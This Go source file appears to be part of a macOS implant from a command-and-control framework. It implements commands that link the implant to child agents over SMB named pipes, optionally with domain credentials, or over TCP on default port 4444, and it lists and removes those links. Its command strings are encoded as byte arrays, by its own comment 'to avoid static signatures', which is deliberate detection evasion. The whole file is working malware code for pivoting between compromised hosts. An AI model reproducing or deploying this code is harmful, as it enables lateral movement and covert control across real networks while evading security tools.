// server/docker/payloads/Darwin/action_link.go
// Link commands for connecting to SMB and TCP child agents

//go:build darwin
// +build darwin

package main

import (
	"strings"
	"time"
)

// Link command strings (constructed to avoid static signatures)
var (
	lnkCmdLink   = string([]byte{0x6c, 0x69, 0x6e, 0x6b})                   // link
	lnkCmdUnlink = string([]byte{0x75, 0x6e, 0x6c, 0x69, 0x6e, 0x6b})       // unlink
	lnkCmdLinks  = string([]byte{0x6c, 0x69, 0x6e, 0x6b, 0x73})             // links
	lnkProtoSmb  = string([]byte{0x73, 0x6d, 0x62})                         // smb
	lnkProtoTcp  = string([]byte{0x74, 0x63, 0x70})                         // tcp
	lnkDefPort   = string([]byte{0x34, 0x34, 0x34, 0x34})                   // 4444
	lnkLocalhost = string([]byte{0x6c, 0x6f, 0x63, 0x61, 0x6c, 0x68, 0x6f, 0x73, 0x74}) // localhost
	lnkLoopback  = string([]byte{0x31, 0x32, 0x37, 0x2e, 0x30, 0x2e, 0x30, 0x2e, 0x31}) // 127.0.0.1
	lnkDot       = string([]byte{0x2e})                                     // .
	lnkColon     = string([]byte{0x3a})                                     // :
	lnkBackslash = string([]byte{0x5c})                                     // \
	lnkUncPrefix = string([]byte{0x5c, 0x5c})                               // \\
	lnkPipePath  = string([]byte{0x5c, 0x70, 0x69, 0x70, 0x65, 0x5c})       // \pipe\
	lnkOutPrefix = string([]byte{0x53, 0x36, 0x7c})                         // S6|
	lnkPipe      = string([]byte{0x7c})                                     // |
	lnkPending   = string([]byte{0x50})                                     // P
	lnkQueued    = string([]byte{0x51})                                     // Q
)

// LinkCommand handles the 'link' command for connecting to SMB and TCP agents
type LinkCommand struct{}

func (c *LinkCommand) Execute(ctx *CommandContext, args []string) CommandResult {
	if len(args) < 2 {
		return CommandResult{
			Output:      Err(E1),
			ExitCode:    1,
			CompletedAt: time.Now().Format(time.RFC3339),
		}
	}

	protocol := strings.ToLower(args[0])
	targetHost := args[1]

	switch protocol {
	case lnkProtoSmb:
		if len(args) < 3 {
			return CommandResult{
				Output:      Err(E1),
				ExitCode:    1,
				CompletedAt: time.Now().Format(time.RFC3339),
			}
		}
		pipeName := args[2]

		// Parse optional credentials: args[3] = DOMAIN\user, args[4] = password
		var creds *SMBCredentials
		if len(args) >= 5 {
			userStr := args[3]
			password := args[4]

			// Parse DOMAIN\user format
			var domain, user string
			if strings.Contains(userStr, lnkBackslash) {
				parts := strings.SplitN(userStr, lnkBackslash, 2)
				domain = parts[0]
				user = parts[1]
			} else {
				// No domain specified, use "." for local
				user = userStr
				domain = lnkDot
			}

			creds = &SMBCredentials{
				Domain:   domain,
				User:     user,
				Password: password,
			}
		}

		// Handle localhost specially - use "." for local machine
		if strings.ToLower(targetHost) == lnkLocalhost || targetHost == lnkLoopback {
			targetHost = lnkDot
		}

		// Build the full UNC pipe path
		pipePath := lnkUncPrefix + targetHost + lnkPipePath + pipeName
		return c.linkSMB(pipePath, creds)

	case lnkProtoTcp:
		port := lnkDefPort
		if len(args) >= 3 {
			port = args[2]
		}

		// Build the TCP address
		address := targetHost + lnkColon + port
		return c.linkTCP(address)

	default:
		return CommandResult{
			Output:      ErrCtx(E32, protocol),
			ExitCode:    1,
			CompletedAt: time.Now().Format(time.RFC3339),
		}
	}
}

func (c *LinkCommand) linkSMB(pipePath string, creds *SMBCredentials) CommandResult {
	// Get the link manager
	lm := GetLinkManager()

	// Attempt to link with credentials (creds can be nil for anonymous)
	routingID, err := lm.Link(pipePath, creds)
	if err != nil {
		return CommandResult{
			Output:      ErrCtx(E33, pipePath) + lnkPipe + err.Error(),
			ExitCode:    1,
			CompletedAt: time.Now().Format(time.RFC3339),
		}
	}

	// Perform immediate handshake round-trip
	handshakeResult := performImmediateHandshake(lm, routingID)

	return CommandResult{
		Output:      lnkOutPrefix + pipePath + lnkPipe + routingID + lnkPipe + handshakeResult,
		ExitCode:    0,
		CompletedAt: time.Now().Format(time.RFC3339),
	}
}

func (c *LinkCommand) linkTCP(address string) CommandResult {
	// Get the link manager
	lm := GetLinkManager()

	// Attempt to link
	routingID, err := lm.LinkTCP(address)
	if err != nil {
		return CommandResult{
			Output:      ErrCtx(E33, address) + lnkPipe + err.Error(),
			ExitCode:    1,
			CompletedAt: time.Now().Format(time.RFC3339),
		}
	}

	// Perform immediate handshake round-trip
	handshakeResult := performImmediateHandshake(lm, routingID)

	return CommandResult{
		Output:      lnkOutPrefix + address + lnkPipe + routingID + lnkPipe + handshakeResult,
		ExitCode:    0,
		CompletedAt: time.Now().Format(time.RFC3339),
	}
}

// performImmediateHandshake handles the full handshake round-trip immediately
func performImmediateHandshake(lm *LinkManager, routingID string) string {
	// Wait briefly for the SMB/TCP agent's handshake to arrive in the handshake queue
	const handshakeWaitTimeout = 5 * time.Second
	deadline := time.Now().Add(handshakeWaitTimeout)

	var handshakeData *LinkDataOut
	for time.Now().Before(deadline) {
		// Check handshake queue for handshake data (sent via "lh" field)
		data := lm.GetHandshakeData()
		if data != nil && data.RoutingID == routingID {
			handshakeData = data
			break
		}
		// Re-queue any handshake that wasn't for us
		if data != nil {
			lm.queueHandshakeData(data)
		}
		time.Sleep(100 * time.Millisecond)
	}

	if handshakeData == nil {
		return lnkPending
	}

	// Queue the handshake data to be sent via "lh" field on next POST to server
	lm.queueHandshakeData(handshakeData)
	return lnkQueued
}

// UnlinkCommand handles the 'unlink' command for disconnecting from SMB/TCP agents
type UnlinkCommand struct{}

func (c *UnlinkCommand) Execute(ctx *CommandContext, args []string) CommandResult {
	if len(args) < 1 {
		return CommandResult{
			Output:      Err(E1),
			ExitCode:    1,
			CompletedAt: time.Now().Format(time.RFC3339),
		}
	}

	routingID := args[0]
	lm := GetLinkManager()

	if err := lm.Unlink(routingID); err != nil {
		return CommandResult{
			Output:      ErrCtx(E34, routingID),
			ExitCode:    1,
			CompletedAt: time.Now().Format(time.RFC3339),
		}
	}

	return CommandResult{
		Output:      SuccCtx(S7, routingID),
		ExitCode:    0,
		CompletedAt: time.Now().Format(time.RFC3339),
	}
}

// LinksCommand handles the 'links' command for listing active SMB/TCP links
type LinksCommand struct{}

func (c *LinksCommand) Execute(ctx *CommandContext, args []string) CommandResult {
	lm := GetLinkManager()
	output := lm.ListLinks()

	return CommandResult{
		Output:      output,
		ExitCode:    0,
		CompletedAt: time.Now().Format(time.RFC3339),
	}
}
